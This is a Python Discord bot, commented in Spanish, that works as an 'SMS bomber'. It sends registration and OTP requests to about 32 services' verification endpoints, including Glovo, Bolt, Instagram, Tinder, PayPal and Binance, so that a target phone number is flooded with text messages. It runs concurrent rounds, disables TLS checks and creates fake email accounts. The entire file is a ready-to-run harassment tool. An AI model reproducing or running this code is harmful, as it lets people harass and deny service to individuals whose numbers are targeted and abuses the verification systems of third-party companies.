#!/usr/bin/env python3
"""
Discord SMS Bomber Bot - MULTI-API
Usa multiples servicios para maximizar SMS
"""

import discord
from discord.ext import commands
from discord import app_commands
import requests
import asyncio
import uuid
import os
import urllib3
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings()

TOKEN = os.environ.get("DISCORD_TOKEN")
if not TOKEN:
    print("ERROR: Configura la variable DISCORD_TOKEN")
    exit(1)

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

executor = ThreadPoolExecutor(max_workers=50)

class SMSBomber:
    def __init__(self):
        self.results = {"success": 0, "failed": 0}
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json"
        })

    def reset(self):
        self.results = {"success": 0, "failed": 0}

    def generate_uuid(self):
        return str(uuid.uuid4())

    def generate_email(self):
        return f"user{uuid.uuid4().hex[:10]}@gmail.com"

    def try_api(self, url, data, method="POST", headers=None):
        """Intenta enviar a una API"""
        try:
            if headers:
                resp = self.session.post(url, json=data, headers=headers, timeout=8)
            else:
                resp = self.session.post(url, json=data, timeout=8)
            return resp.status_code in [200, 201, 202, 204]
        except:
            return False

    # ========== SERVICIOS ESPANA ==========

    def glovo_es(self, phone):
        return self.try_api(
            "https://api.glovoapp.com/v3/auth/phone",
            {"phone": phone}
        )

    def glovo_v2(self, phone):
        headers = {
            "Glovo-App-Platform": "web",
            "Glovo-App-Type": "customer",
            "Glovo-Api-Version": "14"
        }
        return self.try_api(
            "https://api.glovoapp.com/v0/identity/flow/start_verification",
            {
                "identityValue": {"phoneNumber": phone},
                "identityType": "PHONE_NUMBER",
                "identityMetadata": {"selectedVerificationMethod": "SMS"}
            },
            headers=headers
        )

    def just_eat_es(self, phone):
        return self.try_api(
            "https://es.just-eat.es/api/v1/account/register",
            {"phone": phone}
        )

    def cabify_es(self, phone):
        return self.try_api(
            "https://cabify.com/api/mobile/v3/auth/request-otp",
            {"phone_number": phone}
        )

    def bolt_simple(self, phone):
        return self.try_api(
            "https://user.bolt.eu/user/register/phone",
            {"phone": phone, "country": "es"}
        )

    def bolt_driver(self, phone):
        """Bolt Driver Registration - 2 pasos"""
        try:
            # Paso 1
            url1 = "https://driverregistration.live.boltsvc.net/driverRegistration/startRegistration"
            params = {"version": "HP.24.33", "device_name": "HP", "device_os_version": "web", "deviceId": "web", "deviceType": "web", "language": "es-es"}
            data1 = {"email": self.generate_email(), "phone": phone, "city_id": 1617, "terms_consent_accepted": 1}
            resp1 = self.session.post(url1, params=params, json=data1, timeout=8)
            if resp1.status_code != 200:
                return False
            token = resp1.json().get("data", {}).get("token")
            if not token:
                return False

            # Paso 2
            url2 = "https://driverregistration.live.boltsvc.net/driverRegistration/startVerification?brand=bolt"
            data2 = {"token": token, "verification_code_channel": "sms", "device_os_version": "web", "device_name": "Mozilla/5.0", "deviceId": self.generate_uuid(), "device_type": "web", "version": "DR.3.90", "language": "es-es", "visitor_id": f"visitor-driver-{self.generate_uuid()}"}
            resp2 = self.session.post(url2, json=data2, timeout=8)
            return resp2.status_code == 200 and resp2.json().get("code") == 0
        except:
            return False

    def freenow_es(self, phone):
        return self.try_api(
            "https://api.free-now.com/auth/phone",
            {"phoneNumber": phone}
        )

    def wallapop_es(self, phone):
        return self.try_api(
            "https://api.wallapop.com/api/v3/users/phone-verification",
            {"phone": phone}
        )

    def milanuncios_es(self, phone):
        return self.try_api(
            "https://www.milanuncios.com/api/v2/users/sms",
            {"phone": phone.replace("+34", "")}
        )

    def vibbo_es(self, phone):
        return self.try_api(
            "https://www.vibbo.com/api/auth/phone",
            {"phone": phone}
        )

    # ========== SERVICIOS INTERNACIONALES ==========

    def telegram(self, phone):
        return self.try_api(
            "https://my.telegram.org/auth/send_password",
            {"phone": phone}
        )

    def instagram(self, phone):
        headers = {"User-Agent": "Instagram 219.0.0.12.117 Android"}
        return self.try_api(
            "https://i.instagram.com/api/v1/accounts/send_sms_code/",
            {"phone_number": phone},
            headers=headers
        )

    def tiktok(self, phone):
        return self.try_api(
            "https://www.tiktok.com/api/passport/web/send_code/",
            {"mobile": phone, "type": "register"}
        )

    def snapchat(self, phone):
        return self.try_api(
            "https://accounts.snapchat.com/accounts/send_sms",
            {"phone": phone}
        )

    def discord_sms(self, phone):
        return self.try_api(
            "https://discord.com/api/v9/auth/register/phone",
            {"phone": phone}
        )

    def uber(self, phone):
        return self.try_api(
            "https://cn-geo1.uber.com/rt/silk-screen/sign-up",
            {"phoneNumber": phone}
        )

    def lyft(self, phone):
        return self.try_api(
            "https://www.lyft.com/api/auth/phone",
            {"phone_number": phone}
        )

    def deliveroo(self, phone):
        return self.try_api(
            "https://api.deliveroo.com/orderapp/v1/auth",
            {"phone": phone}
        )

    def tinder(self, phone):
        return self.try_api(
            "https://api.gotinder.com/v2/auth/sms/send",
            {"phone_number": phone}
        )

    def bumble(self, phone):
        return self.try_api(
            "https://api.bumble.com/mwebapi.pyi",
            {"phone": phone}
        )

    def badoo(self, phone):
        return self.try_api(
            "https://badoo.com/api/sms",
            {"phone": phone}
        )

    def paypal(self, phone):
        return self.try_api(
            "https://www.paypal.com/signin/api/challenge/sms",
            {"phone": phone}
        )

    def revolut(self, phone):
        return self.try_api(
            "https://api.revolut.com/auth/sms",
            {"phone": phone}
        )

    def binance(self, phone):
        return self.try_api(
            "https://www.binance.com/bapi/accounts/v1/protect/account/mobile/sendMobileVerifyCode",
            {"mobile": phone}
        )

    def airbnb(self, phone):
        return self.try_api(
            "https://api.airbnb.com/v2/phone_verify",
            {"phone": phone}
        )

    def booking(self, phone):
        return self.try_api(
            "https://www.booking.com/authentication/phone",
            {"phone": phone}
        )

    def amazon(self, phone):
        return self.try_api(
            "https://www.amazon.com/ap/cvf/verify",
            {"phone": phone}
        )

    def aliexpress(self, phone):
        return self.try_api(
            "https://login.aliexpress.com/sms/send",
            {"phone": phone}
        )

    def shein(self, phone):
        return self.try_api(
            "https://www.shein.com/api/member/sms",
            {"phone": phone}
        )

    def spotify(self, phone):
        return self.try_api(
            "https://www.spotify.com/api/account/sms",
            {"phone": phone}
        )

    def steam(self, phone):
        return self.try_api(
            "https://store.steampowered.com/phone/add_ajaxop",
            {"phone": phone}
        )

    def nike(self, phone):
        return self.try_api(
            "https://unite.nike.com/phone/request",
            {"phone": phone}
        )

    def get_all_services(self):
        """Retorna lista de todos los servicios"""
        return [
            # Espana - Prioritarios
            ("Bolt Driver", self.bolt_driver),
            ("Glovo", self.glovo_es),
            ("Glovo V2", self.glovo_v2),
            ("Cabify", self.cabify_es),
            ("Wallapop", self.wallapop_es),
            ("JustEat", self.just_eat_es),
            ("FreeNow", self.freenow_es),
            ("Milanuncios", self.milanuncios_es),
            ("Vibbo", self.vibbo_es),
            ("Bolt", self.bolt_simple),
            # Internacionales
            ("Telegram", self.telegram),
            ("Instagram", self.instagram),
            ("TikTok", self.tiktok),
            ("Snapchat", self.snapchat),
            ("Discord", self.discord_sms),
            ("Uber", self.uber),
            ("Lyft", self.lyft),
            ("Deliveroo", self.deliveroo),
            ("Tinder", self.tinder),
            ("Bumble", self.bumble),
            ("Badoo", self.badoo),
            ("PayPal", self.paypal),
            ("Revolut", self.revolut),
            ("Binance", self.binance),
            ("Airbnb", self.airbnb),
            ("Booking", self.booking),
            ("Amazon", self.amazon),
            ("AliExpress", self.aliexpress),
            ("Shein", self.shein),
            ("Spotify", self.spotify),
            ("Steam", self.steam),
            ("Nike", self.nike),
        ]

    def call_service_sync(self, service_func, phone):
        """Llama un servicio de forma sincrona"""
        try:
            result = service_func(phone)
            if result:
                self.results["success"] += 1
            else:
                self.results["failed"] += 1
            return result
        except:
            self.results["failed"] += 1
            return False

    async def bomb_all(self, phone, rounds=1):
        """Bombardea con todos los servicios"""
        services = self.get_all_services()
        loop = asyncio.get_event_loop()

        for r in range(rounds):
            tasks = []
            for name, service in services:
                task = loop.run_in_executor(executor, self.call_service_sync, service, phone)
                tasks.append(task)

            await asyncio.gather(*tasks)
            yield (r + 1) * len(services)

bomber = SMSBomber()

@bot.event
async def on_ready():
    print(f"="*50)
    print(f"  BOT CONECTADO: {bot.user}")
    print(f"  Servidores: {len(bot.guilds)}")
    print(f"  Servicios: {len(bomber.get_all_services())}")
    print(f"="*50)
    try:
        synced = await bot.tree.sync()
        print(f"  Comandos sincronizados: {len(synced)}")
    except Exception as e:
        print(f"  Error sync: {e}")

@bot.tree.command(name="bomb", description="Bombardear numero con SMS")
@app_commands.describe(
    phone="Numero con codigo (+34...)",
    rounds="Rondas de bombardeo (cada ronda = todos los servicios)"
)
async def bomb_command(interaction: discord.Interaction, phone: str, rounds: int = 3):
    if not phone.startswith("+"):
        phone = "+34" + phone

    if rounds > 20:
        rounds = 20
    if rounds < 1:
        rounds = 1

    bomber.reset()
    services = bomber.get_all_services()
    total_attempts = rounds * len(services)

    await interaction.response.send_message(
        f"```\n"
        f"SMS BOMBER - MULTI-API\n"
        f"{'='*35}\n"
        f"Target: {phone}\n"
        f"Servicios: {len(services)}\n"
        f"Rondas: {rounds}\n"
        f"Total intentos: {total_attempts}\n"
        f"{'='*35}\n"
        f"Bombardeando...\n"
        f"```"
    )

    async for progress in bomber.bomb_all(phone, rounds):
        await interaction.edit_original_response(content=
            f"```\n"
            f"SMS BOMBER EN PROGRESO\n"
            f"{'='*35}\n"
            f"Target: {phone}\n"
            f"Progreso: {progress}/{total_attempts}\n"
            f"Exitosos: {bomber.results['success']}\n"
            f"Fallidos: {bomber.results['failed']}\n"
            f"{'='*35}\n"
            f"```"
        )

    await interaction.edit_original_response(content=
        f"```\n"
        f"SMS BOMBER COMPLETADO\n"
        f"{'='*35}\n"
        f"Target: {phone}\n"
        f"Total intentos: {total_attempts}\n"
        f"SMS ENVIADOS: {bomber.results['success']}\n"
        f"Fallidos: {bomber.results['failed']}\n"
        f"Tasa exito: {bomber.results['success']*100//max(1,total_attempts)}%\n"
        f"{'='*35}\n"
        f"```"
    )

@bot.tree.command(name="services", description="Ver servicios disponibles")
async def services_command(interaction: discord.Interaction):
    services = bomber.get_all_services()

    es_services = [n for n, _ in services[:10]]
    int_services = [n for n, _ in services[10:]]

    await interaction.response.send_message(
        f"```\n"
        f"SERVICIOS DISPONIBLES ({len(services)})\n"
        f"{'='*35}\n"
        f"ESPANA:\n"
        f"  {', '.join(es_services)}\n"
        f"\n"
        f"INTERNACIONALES:\n"
        f"  {', '.join(int_services)}\n"
        f"{'='*35}\n"
        f"Uso: /bomb +34XXXXXXXXX 3\n"
        f"(3 rondas = {len(services)*3} intentos)\n"
        f"```"
    )

@bot.tree.command(name="help", description="Ver comandos")
async def help_command(interaction: discord.Interaction):
    await interaction.response.send_message(
        f"```\n"
        f"SMS BOMBER BOT - COMANDOS\n"
        f"{'='*35}\n"
        f"/bomb <numero> <rondas>\n"
        f"   Bombardear numero\n"
        f"   Ejemplo: /bomb +34612345678 5\n"
        f"   (5 rondas x 32 servicios = 160 intentos)\n"
        f"\n"
        f"/services\n"
        f"   Ver servicios disponibles\n"
        f"\n"
        f"/help\n"
        f"   Ver esta ayuda\n"
        f"{'='*35}\n"
        f"```"
    )

@bot.command(name="bomb")
async def bomb_prefix(ctx, phone: str, rounds: int = 3):
    if not phone.startswith("+"):
        phone = "+34" + phone
    if rounds > 20:
        rounds = 20

    bomber.reset()
    services = bomber.get_all_services()
    total = rounds * len(services)

    msg = await ctx.send(f"```\nBombardeando {phone} ({total} intentos)...\n```")

    async for progress in bomber.bomb_all(phone, rounds):
        await msg.edit(content=f"```\nProgreso: {progress}/{total} | OK: {bomber.results['success']}\n```")

    await msg.edit(content=
        f"```\n"
        f"COMPLETADO - {phone}\n"
        f"SMS enviados: {bomber.results['success']}/{total}\n"
        f"```"
    )

if __name__ == "__main__":
    print(f"\nIniciando bot con {len(SMSBomber().get_all_services())} servicios...")
    bot.run(TOKEN)
